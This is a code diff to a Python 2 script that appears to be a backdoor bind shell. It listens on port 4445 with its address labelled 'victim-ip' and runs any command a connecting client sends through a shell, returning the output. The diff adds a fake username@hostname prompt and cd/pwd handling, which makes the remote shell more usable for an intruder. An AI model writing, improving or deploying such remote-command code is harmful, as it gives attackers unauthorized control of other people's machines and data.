@@ -15,7 +15,7 @@ __status__ = "Production"
 import socket
 import subprocess
 import sys
-
+import os
 ip = "victim-ip"
 port = 4445
 
@@ -27,16 +27,25 @@ print ("Listener ready on %s:%d" % (ip,port))
 
 client, addr = server.accept()
 
-print ("Connected to %s on port %d" % (ip,port))	
+print ("Connected to %s on port %d" % (ip,port))
+hostinfo=os.getenv('USERNAME')+"@"+socket.gethostname()+"~"	
 while True:
 	data = str(client.recv(1024))
 	data = data.strip()
 	if not data:
-		print "command cannot be blank my friend"
+		client.sendall(hostinfo+os.getcwd()+"# command cannot be blank my friend \n"+hostinfo+os.getcwd()+"#"+" ")
+		print ""
+	elif "cd" in data.strip():
+		pathExtract = data.replace ("cd ", "")
+		os.chdir(pathExtract)
+		client.sendall(hostinfo+os.getcwd()+"# Switched Path to: "+os.getcwd()+"\n"+hostinfo+os.getcwd()+"#"+" ")
+	elif data.strip() == "pwd":
+		client.sendall(hostinfo+os.getcwd()+"#"+" "+" "+os.getcwd()+"\n"+hostinfo+os.getcwd()+"#"+" ")
 	elif data.strip() == "terminate":
 		client.sendall("bye buddy")
 		client.close()
 		sys.exit(0)
 	else:
 		output = subprocess.check_output(data, shell=True)
+		output=hostinfo+os.getcwd()+"#"+" "+output+"\n"+hostinfo+os.getcwd()+"#"+" "
 		client.sendall(output)
